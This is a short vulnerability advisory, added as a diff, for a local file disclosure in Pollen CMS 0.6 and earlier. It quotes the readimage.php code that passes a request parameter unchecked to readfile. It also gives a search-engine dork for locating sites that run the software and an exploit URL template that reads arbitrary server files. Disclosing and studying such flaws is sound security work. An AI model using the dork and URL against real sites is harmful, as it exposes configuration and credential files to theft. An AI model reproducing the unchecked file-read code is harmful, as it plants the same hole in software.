@@ -1,0 +1,31 @@
+# Title: Pollen CMS <= 0.6 - Local File Disclosure
+# Google Dork: intext:"Powered by Pollen CMS"
+# Date: 25 Mars 2013
+# Exploit Author: MizoZ
+# Vendor Homepage: pollencms.com (BROKEN)
+# Software Link: https://code.google.com/p/pollencms/
+# Version: 0.6
+# Tested on: Ubuntu Desktop 12.04
+
+-- File "[path]/core/lib/readimage.php"
+
+02 - $image=urldecode($_GET["image"]);
+03 - if(is_file($image)){
+04 - header("Pragma: no-cache");
+05 - header("Expires: 0");
+06 - header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
+07 - header("Cache-Control: no-cache, must-revalidate");
+08 - header("Content-type: image/jpg");
+09 - readfile($image);
+10 - }else{
+11 - header("HTTP/1.0 404 Not Found");
+12 - }
+
+
+-- Problem
+
+   The script only verifies the existence of the given file.
+
+
+-- Exploit
+http://<server>/<path>/core/lib/readimage.php?image=[php urlencoded path to file]
